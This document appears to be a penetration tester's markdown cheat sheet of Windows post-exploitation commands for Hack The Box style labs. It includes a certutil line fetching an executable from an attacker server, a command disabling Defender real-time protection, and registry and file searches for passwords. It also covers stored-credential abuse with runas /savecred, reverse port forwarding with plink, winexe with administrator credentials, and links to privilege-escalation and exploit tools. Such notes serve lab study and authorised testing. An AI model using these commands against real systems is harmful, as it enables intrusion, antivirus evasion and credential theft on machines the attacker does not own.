### Powershell 
![powershell](https://github.com/cyberwr3nch/hackthebox/blob/master/scripts/files/powershell.png)
#### Get to know the current user, which you are logged in 

```powershell
# system_name\user_name
[System.Security.Principal.WindowsIdentity]::GetCurrent().Name

# user name & system name
$env:UserName
$env:UserDomain

# find exe's in the current directory
# -erroraction 'silentlycontinue' similar to 2>/dev/null
Get-ChildItem -Filter "*.exe" -Recurse -erroraction 'silentlycontinue' 
```

#### Disable RealTimeProtection

```powershell
#disables real time protection
Set-MpPreference -DisableRealtimeMonitoring $true

#enables real time protection
Set-MpPreference -DisableRealtimeMonitoring $false
```

### CMD Commands

#### Normal CMD

```powershell
# get current username
whoami

# get system information
systeminfo

# wget for windows
certutil -urlcache -f http://iamserver:port/xxxx.exe xxxx.exe

# grep() for os name
systeminfo | findstr /C:"OS Name"

# locate() for files
findstr /si password *.txt *.ini *.config *.xml *.bat

# locate *.exe's
dir /s /b *.exe
where *.exe

# get the hostname
hostname

# know the priviledges we have
# token impresonate attacks can be donw with this privs
whoami /priv

# know all the users in the machine
net user 

# Obtain information about the specific user
net user <username>

# Obtain users belongs to a specific groups
# users belonging to the sudo groups
net localgroup administrators / <group name>

# get to know network
ipconfig
ipconfig /all

# internal network services
netstat -ano 

# get to know antivirus
sc query windefend	#know about windows defender status (up / down)
sc queryex type= service #brings all the running services in the machine

# get to know about the firewall 
netsh show firewall state

# Search for passwords in registry
reg query HKLM /f password /t REG_SZ /s

# port forward using plink.exe -l user -pw password for the user 
plink -l root -pw <pass> -R PORT:127.0.0.1:PORT 10.10.x.x

# search for binaries in the machine, like whereis in linux
# rn searching for powershell.exe in C:\Window\System32
where /R C:\windows\System32 powershell.exe

# look for stored credentials in the machine
cmdkey /list 

# run as commands, when the creds for the user is stored which can be confirmed with cmdkey /list
runas.exe /user:domain\UserName /savecred "C:\Windows\System32\cmd.exe /c Type C:\Users\UserName\Desktop\(user|root).txt > C:\Users\lowUser\root.txt"


```

#### CMD commands when wmic is available

```powershell
# updation list
wmic qfc get Caption,Description,HotFixID,InstalledOn

# list disks with wmic
wmic logicaldisk get caption,description,providenBane

```

#### When Port forwarding:

- In the linux machine

```bash
# check ssh installation
sudo apt install ssh
# for a normal user, the ssh login will be smooth 
# for a root user, edit the sshd.config
# change from #PermitRootLogin prohibit-password -> PermitRootLogin yes
vi /etc/ssh/sshd_config
# start the ssh service
sudo service ssh start
# check the port forwarded service
netstat -ano
# after forwading the port, if user creds are available try winexe, 127.0.0.1 is given since the particular port is forwarded to out local machine
winexe -U Administrator%<pass> //127.0.0.1 "cmd.exe"

```

#### Resource

##### \*.exe

- [winPEAS.exe]("https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS")
- [Seatbelt.exe]("https://github.com/GhostPack/Seatbelt")
- [Watson.exe]("https://github.com/rasta-mouse/Watson")
- [SharpUp.exe]("https://github.com/GhostPack/SharpUp")

##### \*.ps1

- [Sherlock.ps1]("https://github.com/rasta-mouse/Sherlock")
- [PowerUp.ps1]("https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerUp")
- [Jaws-enum.ps1]("https://github.com/411Hall/JAWS")
- [PowerUp.ps1]("https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1")

##### Misc

- [Windows-exploit-suggester.py]("https://github.com/AonCyberLabs/Windows-Exploit-Suggester")
- [Windows-Kernal-exploits]("https://github.com/SecWiki/windows-kernal-exploits")
- [CVE's]("https://github.com/nomi-sec/PoC-in-GitHub")
- [winexe]("https://tools.kali.org/maintaining-access/winexe")
- [PsExec]("https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py")
- [SmbExec]("https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py")
- [WmiExec]("https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py")
- [Impersonate PrivEsc]("https://github.com/gtworek/Priv2Admin")


